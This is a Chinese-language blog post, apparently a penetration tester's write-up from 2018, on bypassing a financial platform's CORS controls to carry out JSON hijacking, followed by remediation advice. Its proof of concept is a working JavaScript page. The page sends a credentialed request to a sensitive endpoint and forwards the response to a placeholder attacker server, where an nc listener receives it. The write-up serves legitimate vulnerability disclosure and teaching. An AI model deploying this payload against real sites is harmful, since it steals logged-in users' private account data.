---
layout:     post
title:      "记一次绕过CORS实现通用型json劫持经历"
subtitle:   " \"安全研究\""
date:       2018-01-27 11:35:25
author:     "y1r0nz"
header-img: "img/hack.jpg"
tags:
    - 安全研究
    - 渗透经历
---



#### 0x01 前言

 基于前端的安全访问控制在如今的安全问题中依然是影响力比较大的问题，针对网页的xss，csrf等安全漏洞也是大多数运营商比较头疼的问题。面对这些安全风险，大多数互联网金融机构站点对访问服务端的用户采取了相应的跨域访问控制的措施，比如httponly、指定access-control-origin-allow合法域名访问名单，从而从用户端到服务端基本实现CSP。但是一些机构在实施这些措施的过程中并没有严格按照访问控制策略进行实现，导致一些同源策略能够比较轻松的绕过，使得恶意用户能够利用这种方式进一步窃取合法用户的敏感信息、造成更大规模的钓鱼事件，严重影响了运营商的正常运作。

恰好这几天项目组有个众测的项目，在还没有深入对平台进行安全测试之前，结合之前freebuf上有人发的一篇CORS绕过的[文章](http://www.freebuf.com/news/160917.html)，测了下这个平台有关跨域的安全访问控制的策略，发现的问题还确实很多。之前这个平台做的访问控制就像一个纸老虎，根本起不了任何作用，这让我感到一丝的不安。

#### 0x02 几个小问题

* POST与GET请求可以任意相互转换

  在没有发现更大的影响规模的时候，这个问题其实很鸡肋，领导和开发可能根本不会去重视。但是，这个问题所能够延伸出来的其它比较严重的安全问题却多种多样。举一个例子：假如攻击者可以随意转换get和post请求数据，已经对csrf这种跨站伪造漏洞大开了方便之门，他们无需花更多的经历去诱使受害用户提交post请求，只需要在页面标签中引入src属性，便能够轻松对受害用户账户和进行攻击。

  ![post_get1](https://github.com/yangrz/blog/raw/gh-pages/img/post_get1.png)

  ![post_get2](https://github.com/yangrz/blog/raw/gh-pages/img/post_get2.png)

* 非法控制Access-Control-Origin-Allow返回头

  Access-Control-Origin-Allow返回消息头是用来严格控制能够操纵请求的域名，请求所返回的信息只能在指定的合法域名中传输。很多情况下，大多数开发人员可能并不理解这个属性值的具体目的，直接从请求的origin属性中读取这个域名，使得服务端误以为这就是合法域名。另外，安全等级比较高的应用服务虽然严格控制了Access-Control-Origin-Allow返回头，但是开发人员并没有验证origin的合法性和有效性，攻击者仍然可以通过操纵origin头来绕过访问控制。

  ![access_control_origin_allow1](https://github.com/yangrz/blog/raw/gh-pages/img/access_control_origin_allow1.png)

  ![access_control_origin_allow2](https://github.com/yangrz/blog/raw/gh-pages/img/access_control_origin_allow2.png))

* 返回体敏感信息未加密

  多数服务端对返回的数据没有进行脱敏控制，攻击者通过跨域带外查询的方式一旦窃取这些数据将严重影响用户隐私信息。

  ![minganxinxi](https://github.com/yangrz/blog/raw/gh-pages/img/minganxinxi.png)

#### 0x03 Combo利用，实现json劫持

在分析完应用本身存在的漏洞利用环境之后，真正实现json劫持攻击的还需要以下两个现实条件：

* 受害者登陆受害网站平台，拥有查询账户信息权限
* 攻击者能够欺骗受害者访问伪造页面

拥有以上的所有条件，我们就可以完全实现窃取受害者账户信息了。

1. 在观察数据包交互的过程中，我发现请求体中大量的查询账户信息操作，而且这些操作都存在上节所描述的三个基本问题。验证就不放图了，上节都有。

2. 在攻击者远程服务器上精心伪造页面，页面代码模板可能是按照如下代码去实现的：

   ```javascript
   <!DOCTYPE html>
   <html>
   <head><title>xxxx CORs Poc</title></head>
   <body>
   <center>
   <h2>xxxx CORs POC</h2>
   <button type="button" onclick="cors()">Poc</button>
   </div>
   <script>
     function cors(){
       var xhttp = new XMLHttpRequest();
       xhttp.onreadystatechange = function() {
         if(this.readyState == 4 && this.status == 200) 
         {
           document.location='http://你的服务器地址:远程监听端口号?'+escape(this.responseText);
         }
       };
       xhttp.open('GET','https://你发现的查询敏感json数据的get请求接口',true);
       xhttp.withCredentials = true;
       xhttp.send();
     }
   </script>
   ```

3. 诱使受害用户访问伪造页面，在远程服务器就可以监听用户访问请求

   ![nc_listening](https://github.com/yangrz/blog/raw/gh-pages/img/nc_listening.png)

#### 0x04 修复建议&总结

针对json劫持这一类问题，可能在网站平台建立初期特别容易出现，这要求开发人员深入理解跨域和同源策略，并能够采取多样的手段避免这种问题发生。在通常情况，不考虑具体业务情况下，有如下最有效几种通用修复方案：

1. 在开启access-control-origin-allow消息头情况下，强烈建议在服务端验证origin有效性与合法性。
2. 针对每次查询请求添加随机token值，并在服务端进行有效验证，防止查询敏感信息请求的滥用。
3. 在必要情况下使用验证码查询这种方式，但是会影响用户体验。
4. 开启referer验证；服务端可以验证请求referer有效性，防止请求伪造。

总而言之，我们虽然不能够保证我们的应用服务百分之百的绝对安全，但是能够最大限度的针对具体业务免受安全威胁是目前大部分企业或者运营商建立应用服务安全架构的首要目标。

#### 0x05 相关文献

1. [http://www.freebuf.com/news/160917.html](http://www.freebuf.com/news/160917.html) 《挖洞经验 | 看我如何利用两个漏洞实现雅虎邮箱通讯录信息获取》
2. [http://www.freebuf.com/articles/web/158529.html](http://www.freebuf.com/articles/web/158529.html) 《挖洞经验 | 看我如何绕过Yahoo！View的CORS限制策略
3. [http://www.ruanyifeng.com/blog/2016/04/cors.html](http://www.ruanyifeng.com/blog/2016/04/cors.html) 《跨域资源共享 CORS 详解》
4. [http://www.vuln.cn/6773](http://www.vuln.cn/6773) 《利用JSONP进行水坑攻击》